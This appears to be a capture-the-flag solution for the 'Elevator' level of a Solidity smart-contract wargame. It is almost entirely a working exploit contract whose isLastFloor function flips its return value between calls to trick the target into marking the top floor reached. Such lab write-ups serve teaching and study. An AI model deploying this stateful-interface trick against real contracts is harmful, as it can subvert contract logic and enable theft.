# 11 - Elevator

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorExploit {
    IElevator private _elevatorContract;
    bool private _isLastFloor = false;

    /**
     * Constructor sets `Elevator` contract.
     */
    constructor(address elevatorContractAddress) {
        _elevatorContract = IElevator(elevatorContractAddress);
    }

    /**
     * Will be called by `Elevator` contract to confirm `floor` is last floor.
     *
     * Note that this returns 'false' first as the conditional in the contract
     * is: if (! building.isLastFloor(_floor)) { ... }. It then returns 'true'
     * on its second call, when the `top` variable is assigned.
     */
    function isLastFloor(uint floor) external returns (bool) {
        bool _isLastFloorValueToReturn = _isLastFloor;

        _isLastFloor = !_isLastFloor;

        return _isLastFloorValueToReturn;
    }

    /**
     * Calls `Elevator` contract's `goTo` with `floor`.
     */
    function goTo(uint floor) external {
        _elevatorContract.goTo(floor);
    }
}
```
